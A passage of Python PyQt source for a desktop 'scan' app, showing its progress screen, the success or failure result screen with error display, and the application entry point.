        self._pct_lbl.setStyleSheet(f"color: {C.ACCENT};")
        self._pct_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        card_lay.addWidget(self._pct_lbl)

        self._detail_lbl = QLabel("")
        self._detail_lbl.setFont(QFont("Consolas", 10))
        self._detail_lbl.setStyleSheet(f"color: {C.FG3};")
        self._detail_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        card_lay.addWidget(self._detail_lbl)

        bl.addWidget(scan_card, stretch=1)
        bl.addStretch()

        QTimer.singleShot(300, self._start_scan)
 
    def _start_scan(self):
        self._worker = ScanWorker(self._league, self._pin)
        self._worker.progress.connect(self._on_progress, Qt.ConnectionType.QueuedConnection)
        self._worker.finished.connect(self._on_scan_finished, Qt.ConnectionType.QueuedConnection)
        self._thread = threading.Thread(target=self._worker.run, daemon=True)
        self._thread.start()
 
    def _on_progress(self, pct, title, sub, detail):
        self._bar.setValue(pct)
        self._pct_lbl.setText(f"{pct}%")
        if title: self._scan_title.setText(title)
        if sub: self._scan_sub.setText(sub)
        if detail: self._detail_lbl.setText(detail)
 
    def _on_scan_finished(self, success, error_msg):
        self._build_done_screen(success, error_msg)
 
    # ── SCREEN 4: Done ──
    def _build_done_screen(self, success, error_msg):
        self.resize(460, 420)
        self._center()
        shell, root = self._root_shell()
        self._header(root)

        body = QWidget()
        body.setStyleSheet("background: transparent;")
        bl = QVBoxLayout(body)
        bl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        bl.setSpacing(10)
        bl.setContentsMargins(36, 24, 36, 28)
        root.addWidget(body, stretch=1)

        done_card = GlassCard(radius=C.R_L, elevated=True)
        card_lay = done_card.layout()
        card_lay.setContentsMargins(32, 36, 32, 32)
        card_lay.setSpacing(8)
        card_lay.setAlignment(Qt.AlignmentFlag.AlignCenter)

        if success:
            orb_wrap = QHBoxLayout()
            orb_wrap.addStretch()
            orb_wrap.addWidget(_status_orb(C.ACCENT))
            orb_wrap.addStretch()
            card_lay.addLayout(orb_wrap)

            t = QLabel("Scan Complete")
            t.setFont(QFont("Segoe UI", 22, QFont.Weight.Bold))
            t.setStyleSheet(f"color: {C.FG};")
            t.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(t)

            s1 = QLabel("Results sent to your agent.")
            s1.setStyleSheet(f"color: {C.FG2}; font-size: 13px;")
            s1.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(s1)

            s2 = QLabel("You may close this window.")
            s2.setStyleSheet(f"color: {C.FG3}; font-size: 12px;")
            s2.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(s2)
        else:
            orb_wrap = QHBoxLayout()
            orb_wrap.addStretch()
            orb_wrap.addWidget(_status_orb(C.RED))
            orb_wrap.addStretch()
            card_lay.addLayout(orb_wrap)

            t = QLabel("Scan Failed")
            t.setFont(QFont("Segoe UI", 22, QFont.Weight.Bold))
            t.setStyleSheet(f"color: {C.FG};")
            t.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(t)

            s1 = QLabel("Unable to transmit results.")
            s1.setStyleSheet(f"color: {C.FG2}; font-size: 13px;")
            s1.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(s1)

            if error_msg:
                err_card = GlassCard(radius=C.R_S, shadow=False)
                err_txt = QTextEdit()
                err_txt.setReadOnly(True)
                err_txt.setPlainText(error_msg)
                err_txt.setFixedHeight(90)
                err_txt.setStyleSheet(f"""
                    QTextEdit {{
                        background: transparent;
                        color: {C.RED};
                        border: none;
                        font-family: {C.MONO};
                        font-size: 10px;
                        padding: 10px;
                    }}
                """)
                err_card.layout().addWidget(err_txt)
                card_lay.addWidget(err_card)

            s2 = QLabel("Error saved to Desktop\\zevora_error.txt")
            s2.setStyleSheet(f"color: {C.FG3}; font-size: 12px;")
            s2.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_lay.addWidget(s2)

        bl.addWidget(done_card)
        bl.addSpacing(16)
        close_btn = GlassButton("Close")
        close_btn.clicked.connect(self.close)
        close_wrap = QHBoxLayout()
        close_wrap.addStretch()
        close_wrap.addWidget(close_btn)
        close_wrap.addStretch()
        bl.addLayout(close_wrap)
 
    # ── helpers ──
    def _center(self):
        screen = QApplication.primaryScreen().availableGeometry()
        x = (screen.width() - self.width()) // 2
        y = (screen.height() - self.height()) // 2
        self.move(x, y)
 
 
if __name__ == "__main__":
    app = QApplication(sys.argv)
    apply_ios_app_theme(app)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
